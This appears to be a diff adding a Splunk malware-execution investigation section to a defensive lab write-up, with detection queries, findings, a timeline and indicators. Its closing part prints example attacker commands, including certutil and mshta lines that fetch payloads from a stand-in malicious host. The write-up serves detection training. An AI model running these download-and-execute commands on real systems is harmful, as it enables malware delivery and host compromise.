@@ -776,3 +776,255 @@ Service 1        : WindowsUpdateSvc
 Service 2        : SystemMonitor  
 Persistence Type : Windows Service Installation  
 Event IDs        : 4697, 7045  
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+## 8. Malware Execution Detection Using Splunk ##
+
+## Objective
+
+-Detect malware execution activity by identifying suspicious process creation events, PowerShell abuse, payload downloads, and malicious tools executed after persistence has been            established on a compromised host.
+
+## Investigation Overview
+
+-Windows process creation and PowerShell logs were analyzed to identify malicious activity performed by an attacker after gaining administrative access. The investigation focused on         detecting suspicious processes, encoded PowerShell commands, payload downloads, and identifying the compromised account and source IP.
+
+## Investigation Queries
+
+### View Successful Logins
+```
+index=malware-exe EventCode=4624
+| stats count by src_ip
+| sort - count
+```
+-Displays successful login activity by source IP.
+
+### View Failed Logins
+```
+index=malware-exe EventCode=4625
+| stats count by src_ip
+| sort - count
+```
+-Displays failed login activity by source IP.
+
+### Find Suspicious Source IP
+```
+index=malware-exe
+| stats count by src_ip
+| sort - count
+```
+-Displays source IPs generating activity.  
+-Helps identify abnormal hosts performing malicious actions.  
+
+### View All Process Creation Events
+```
+index=malware-exe EventCode=4688
+```
+-Displays all executed processes.
+
+### Count Executed Processes
+```
+index=malware-exe EventCode=4688
+| stats count by process_name
+| sort - count
+```
+-Shows process execution frequency.
+
+### Detect PowerShell Execution
+```
+index=malware-exe EventCode=4688 process_name=powershell.exe
+```
+-Displays PowerShell activity.
+
+### Detect Encoded PowerShell Commands
+```
+index=malware-exe EventCode=4688 process_name=powershell.exe
+| search command_line="*EncodedCommand*"
+```
+-Detects obfuscated PowerShell commands commonly used by attackers.
+
+### Detect PowerShell Script Execution
+```
+index=malware-exe EventCode=4104
+```
+-Displays PowerShell Script Block Logging events.
+
+### Detect Certutil Usage
+```
+index=malware-exe EventCode=4688 process_name=certutil.exe
+```
+-Detects payload download attempts using Certutil.
+
+### Detect Rundll32 Usage
+```
+index=malware-exe EventCode=4688 process_name=rundll32.exe
+```
+-Detects DLL execution through Rundll32.
+
+### Detect Mshta Usage
+```
+index=malware-exe EventCode=4688 process_name=mshta.exe
+```
+-Detects HTA-based malware execution.
+
+### Investigate Suspicious Source IP
+```
+index=malware-exe src_ip=185.199.110.77
+| sort _time
+```
+-Displays all activity performed by the suspicious IP.
+
+### Investigate Compromised Account Activity
+```
+index=malware-exe user=backup_admin
+| sort _time
+```
+-Displays activity performed by the compromised account.
+
+### View Full Attack Timeline
+```
+index=malware-exe src_ip=185.199.110.77
+| table _time EventCode user process_name command_line src_ip hostname
+| sort _time
+```
+-Displays the complete malware execution sequence.
+
+### Main Malware Execution Detection Query
+```
+index=malware-exe EventCode=4688
+| search process_name IN ("powershell.exe","certutil.exe","payload.exe","rundll32.exe","mshta.exe")
+| table _time user process_name command_line src_ip hostname
+| sort _time
+```
+-Detects commonly abused attacker tools and malware processes.
+
+## Findings
+-Source IP 185.199.110.77 was identified as suspicious.  
+-The compromised account backup_admin executed multiple suspicious processes.  
+-PowerShell was executed using an encoded command.  
+-Certutil was used to download a payload from a remote location.  
+-A malicious executable (payload.exe) was launched.  
+-Rundll32 was used to execute a DLL payload.  
+-Mshta was used to execute a remote HTA file.  
+-The activity indicates malware execution following successful persistence establishment.  
+
+## Attack Timeline  
+10:30:00  EventCode=4624  backup_admin login  
+      ↓
+10:32:00  EventCode=4688  powershell.exe (Encoded Command)  
+      ↓
+10:33:00  EventCode=4104  PowerShell Script Executed  
+      ↓
+10:34:00  EventCode=4688  certutil.exe downloads payload  
+      ↓
+10:35:00  EventCode=4688  payload.exe executed  
+      ↓
+10:37:00  EventCode=4688  rundll32.exe launched  
+      ↓
+10:39:00  EventCode=4688  cmd.exe executed  
+      ↓
+10:41:00  EventCode=4624  backup_admin login  
+      ↓
+10:43:00  EventCode=4688  mshta.exe launched  
+      ↓
+10:45:00  EventCode=4688  powershell.exe executed  
+
+## Conclusion
+
+-The investigation identified malware execution activity originating from 185.199.110.77 using the compromised account backup_admin. The attacker leveraged PowerShell, Certutil, Rundll32,   and Mshta to download and execute malicious payloads. These activities indicate active post-compromise malware execution and represent a significant security risk requiring immediate       containment and remediation.
+
+## Suspicious Indicators  
+
+Source IP        : 185.199.110.77  
+Hostname         : DC01  
+Compromised User : backup_admin  
+
+Suspicious Processes:
+- powershell.exe  
+- certutil.exe  
+- payload.exe  
+- rundll32.exe  
+- mshta.exe  
+
+Event IDs:
+- 4688 (Process Creation)  
+- 4104 (PowerShell Script Block Logging)  
+
+Attack Stage:
+Malware Execution / Post-Exploitation  
+
+## How This Attack Works
+
+-After successfully gaining access and establishing persistence on the system, attackers typically execute malicious tools and payloads to expand control over the compromised host.         Malware execution is one of the most critical stages of an attack because it allows the attacker to perform actions such as downloading additional malware, stealing credentials, moving    laterally, or preparing for data exfiltration.
+
+# In this scenario, the attacker uses the compromised account backup_admin to execute several suspicious processes commonly abused in real-world attacks:
+
+## 1. PowerShell Execution
+
+-The attacker launches powershell.exe with an encoded command to hide malicious activity and evade detection.
+
+Example:
+```
+powershell.exe -EncodedCommand <Base64_String>
+```
+Purpose:
+
+Execute malicious scripts  
+Download payloads  
+Bypass security controls  
+Evade detection through obfuscation  
+
+## 2. Payload Download Using Certutil
+
+-The attacker uses certutil.exe, a legitimate Windows utility, to download a malicious file from a remote server.
+
+Example:
+```
+certutil.exe -urlcache -split -f http://malicious.site/payload.exe payload.exe
+```
+Purpose:
+
+Download malware from attacker-controlled infrastructure  
+Avoid using third-party tools that may trigger security alerts  
+
+## 3. Malware Execution
+
+-After downloading the payload, the attacker executes the malware.
+
+Example:
+```
+payload.exe
+```
+Purpose:
+
+Establish command execution  
+Deploy ransomware or trojans  
+Collect credentials  
+Prepare for lateral movement  
+
+## 4. DLL Execution Using Rundll32
+
+-The attacker uses rundll32.exe to execute malicious DLL files.
+
+Example:
+```
+rundll32.exe payload.dll,Start
+```
+Purpose:
+
+Execute malicious code through a trusted Windows binary  
+Blend malicious activity with normal system processes  
+
+## 5. HTA Execution Using Mshta
+
+-The attacker uses mshta.exe to execute remote HTA files.
+
+Example:
+```
+mshta.exe http://malicious.site/dropper.hta
+```
+Purpose:
+
+Download and execute additional payloads  
+Establish persistence  
+Execute attacker-controlled scripts  
